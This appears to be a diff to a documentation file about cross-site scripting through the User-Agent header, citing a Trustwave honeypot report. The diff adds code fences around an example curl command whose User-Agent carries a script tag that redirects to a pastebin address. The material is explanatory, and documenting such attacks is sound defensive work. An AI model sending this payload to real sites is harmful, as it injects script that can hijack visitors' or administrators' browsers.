@@ -8,8 +8,9 @@
 
 Example:
 
+```bash
    curl https://target.host -H "User-Agent: <SCRIPT>window.location='http://pastebin.com/GsHvJXED'</SCRIPT>" 
-
+```
 
 More info:
 * https://www.trustwave.com/Resources/SpiderLabs-Blog/-Honeypot-Alert--User-Agent-Field-XSS-Attacks/
